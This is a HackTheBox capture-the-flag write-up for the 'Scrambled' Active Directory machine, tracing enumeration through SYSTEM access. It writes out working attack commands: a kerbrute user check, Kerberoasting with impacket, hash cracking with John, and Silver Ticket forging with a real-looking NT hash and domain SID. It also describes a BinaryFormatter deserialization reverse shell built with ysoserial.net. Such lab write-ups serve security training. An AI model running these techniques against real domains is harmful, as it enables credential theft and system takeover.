---
title: HackTheBox - Scrambled
date: 2026-06-23
image: cover.png
tags: [HackTheBox, Medium, Windows, Active Directory]
platform: HackTheBox
os: Windows
difficulty: Medium
points: 65
released: 2022-06-11
ip: 10.129.20.21
boxAvatar: htb-cover.png
excerpt: Scrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user ksimpson. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the Public share with the credentials of ksimpson, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account SqlSvc has a Service Principal Name (SPN) associated with it. An attacker can use this information to perform an attack that is knows as kerberoasting and get the hash of SqlSvc. After cracking the hash and acquiring the credentials for the SqlSvc account an attacker can perform a silver ticket attack to forge a ticket and impersonate the user Administrator on the remote MSSQL service. Enumeration of the database reveals the credentials for user MiscSvc, which can be used to execute code on the remote machine using PowerShell remoting. System enumeration as the new user reveals a .NET application, which is listening on port 4411. Reverse engineering the application reveals that it is using the insecure Binary Formatter class to transmit data, allowing the attacker to upload their own payload and get code execution as nt authority\system.
---

# Scrambled

### NMAP Scanning

```cpp
Open 10.129.20.21:53
Open 10.129.20.21:80
Open 10.129.20.21:88
Open 10.129.20.21:135
Open 10.129.20.21:139
Open 10.129.20.21:389
Open 10.129.20.21:445
Open 10.129.20.21:464
Open 10.129.20.21:593
Open 10.129.20.21:636
Open 10.129.20.21:1433
Open 10.129.20.21:3268
Open 10.129.20.21:3269
Open 10.129.20.21:4411
Open 10.129.20.21:5985
Open 10.129.20.21:9389
```

### SMB - Server Enumeration

{% image %}

The SMB enumeration reveals the hostname `DC1` and the domain `scrm.local`. SMB signing is enabled by default on a domain controller. Notably, NTLM authentication is disabled, meaning all authentication throughout this machine will need to go through Kerberos.

{% image2 %}

### SCRAMBLECORP_ORDERS_V1.0.3 - Custom Binary

Port `4411` is non-standard and worth investigating. Connecting to it reveals a custom application banner:

{% image3 %}

This service will become relevant later in the privilege escalation phase, where reverse engineering the binary exposes the path to SYSTEM.

### LDAP Enumeration

→ Getting the naming contexts:

```cpp
➜  NetExec git:(main) ✗ ldapsearch -x -H ldap://10.129.20.21 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=scrm,DC=local
namingcontexts: CN=Configuration,DC=scrm,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=scrm,DC=local
namingcontexts: DC=DomainDnsZones,DC=scrm,DC=local
namingcontexts: DC=ForestDnsZones,DC=scrm,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

→ Enumerating the domain:

```cpp
➜  NetExec git:(main) ✗ ldapsearch -x -H ldap://10.129.20.21 -b "DC=scrm,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=scrm,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

A successful bind is required before any further LDAP enumeration is possible - anonymous access is not permitted.

### WebServer Enumeration

The `/supportrequest.html` page leaks two potential usernames referenced in the support contact context:

{% image4 %}

Both are worth validating against the domain:

- support
- ksimpson

### Username Validation & Spraying

Running `kerbrute userenum --dc DC1.scrm.local -d scrm.local users.txt` against the collected usernames confirms that `ksimpson` is a valid domain account:

{% image5 %}

Testing the username as the password - a common misconfiguration - returns a successful authentication:

{% image6 %}

With Kerberos as the only available authentication mechanism, a `krb5.conf` needs to be generated and placed in `/etc/krb5.conf`. NetExec handles this with the `--generate-krb5-file` flag: `poetry run NetExec smb 10.129.20.21 -u 'ksimpson' -p 'ksimpson' --kerberos --generate-krb5-file krb5.conf`

The generated configuration:

```cpp
➜  NetExec git:(main) ✗ cat krb5.conf
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = SCRM.LOCAL

[realms]
    SCRM.LOCAL = {
        kdc = dc1.scrm.local
        admin_server = dc1.scrm.local
        default_domain = scrm.local
    }

[domain_realm]
    .scrm.local = SCRM.LOCAL
    scrm.local = SCRM.LOCAL
```

Moving the file into place: `sudo mv krb5.conf /etc/krb5.conf`

With the Kerberos configuration in place, SMB enumeration via NetExec with `--kerberos` works correctly:

```cpp
➜  NetExec git:(main) ✗ poetry run NetExec smb DC1.scrm.local -u 'ksimpson' -p 'ksimpson' --domain scrm.local --kerberos --shares
SMB         DC1.scrm.local  445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC1.scrm.local  445    DC1              [+] scrm.local\ksimpson:ksimpson
SMB         DC1.scrm.local  445    DC1              [*] Enumerated shares
SMB         DC1.scrm.local  445    DC1              Share           Permissions            Remark
SMB         DC1.scrm.local  445    DC1              -----           -----------            ------
SMB         DC1.scrm.local  445    DC1              ADMIN$                                 Remote Admin
SMB         DC1.scrm.local  445    DC1              C$                                     Default share
SMB         DC1.scrm.local  445    DC1              HR
SMB         DC1.scrm.local  445    DC1              IPC$            READ                   Remote IPC
SMB         DC1.scrm.local  445    DC1              IT
SMB         DC1.scrm.local  445    DC1              NETLOGON        READ                   Logon server share
SMB         DC1.scrm.local  445    DC1              Public          READ
SMB         DC1.scrm.local  445    DC1              Sales
SMB         DC1.scrm.local  445    DC1              SYSVOL          READ                   Logon server share
```

Two methods are available to obtain a Kerberos TGT for `ksimpson`:

1. By using kinit:

```cpp
➜  scrambled echo 'ksimpson' | kinit 'ksimpson'
Password for ksimpson@SCRM.LOCAL:
➜  scrambled klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: ksimpson@SCRM.LOCAL

Valid starting       Expires              Service principal
06/23/2026 15:49:15  06/24/2026 01:49:15  krbtgt/SCRM.LOCAL@SCRM.LOCAL
	renew until 06/24/2026 15:49:15
```

1. By using impacket-getTGT:

```cpp
➜  scrambled impacket-getTGT scrm.local/ksimpson:'ksimpson' -dc-ip 10.129.20.21 -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ksimpson.ccache
```

Using `rusthound-ce` over LDAP to collect domain data for BloodHound:

{% image7 %}

Worth noting: the original machine writeup used [`ad-ldap-enum.py`](http://ad-ldap-enum.py) to resolve the server name `DC1` because older tooling could not derive it automatically. The command used was:

```cpp
python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson -v
```

The script produces `.tsv` files from LDAP data, and `Extended Domain Computer Information.tsv` contains the server name:

{% image8 %}

The current version of `netexec` resolves both the server name and domain name automatically, making this workaround unnecessary.

### Public Share Enumeration

The Public share contains a PDF titled “Network Security Changes.pdf” that provides a useful hint:

{% image9 %}

The document confirms an MSSQL service is running on the machine. Service accounts backing SQL Server instances typically have a Service Principal Name (SPN) registered, which makes them candidates for Kerberoasting - requesting a service ticket and cracking the hash offline.

Running `impacket-GetUserSPNs scrm.local/ksimpson:'ksimpson' -dc-host DC1.scrm.local -k` to enumerate SPNs:

{% image10 %}

The `sqlsvc` account has an SPN registered and is vulnerable to Kerberoasting. Requesting and saving the hash:

{% image11 %}

Cracking the hash with John: `sudo john --wordlist=/usr/share/wordlists/rockyou.txt sqlsvc.hash`

{% image12 %}

With valid credentials for the MSSQL service account, a Silver Ticket attack becomes possible - forging a Kerberos service ticket that impersonates the domain Administrator against the SQL service directly.

Three pieces of information are required to forge the ticket:

1. The NTLM hash of the password for the sqlsvc account
2. The domain SID
3. The SPN that the `sqlsvc` account is using.

Using `impacket-ticketer` to forge the Silver Ticket and save it as `Administrator.ccache`:

```cpp
impacket-ticketer -spn "MSSQLSvc/dc1.scrm.local" -user "ksimpson" -password "ksimpson" -nthash "B999A16500B87D17EC7F2E2A68778F05" -domain scrm.local -domain-sid "S-1-5-21-2743207045-1827831105-2542523200" -dc-ip dc1.scrm.local Administrator
```

{% image13 %}

Purging any existing cached tickets with `kdestroy` and importing the forged `Administrator.ccache`:

{% image14 %}

With the Silver Ticket in the credential cache, connecting to the MSSQL service succeeds as the impersonated Administrator with `dbo` access:

{% image15 %}

Local admin access on the SQL service itself is not directly useful for lateral movement, but enumerating the database tables reveals an interesting entry in the `UserImport` table:

{% image16 %}

The recovered credentials belong to `MiscSvc`, who is a member of the Remote Management Users group - granting WinRM access:

{% image17 %}

Connecting with `evil-winrm`:

{% image18 %}

### Privilege Escalation

`MiscSvc` has read access to the `IT` share, which contains a set of interesting files:

{% image19 %}

Downloading the files to a Windows host for analysis and adding the target to the local hosts file:

```cpp
10.129.20.21	DC1.scrm.local
10.129.20.21	scrm.local
```

Attempting to authenticate to the custom application on port `4411` with every set of credentials collected so far fails:

{% image20 %}

Since this is a `.NET` application, `dnSpy` can be used to decompile and inspect the source. Inside the binary there is a hardcoded developer login bypass that can be used to get past authentication:

{% image21 %}

After logging in, enabling logging under the Tools menu and uploading a test order causes the application to create a debug log file: `ScrambleDebugLog.txt`.

{% image22 %}

Inspecting the log file reveals that the application is serializing order data as base64-encoded .NET objects:

{% image23 %}

This is the critical finding - the application is using .NET's `BinaryFormatter` to transmit serialized data, which is a well-known insecure deserialization sink. Using [ysoserial.net](https://github.com/pwntester/ysoserial.net) to generate a deserialization payload that executes a reverse shell:

With the payload generated, sending it directly to port `4411` triggers deserialization on the server side and returns a shell as `nt authority\system`:

{% image24 %}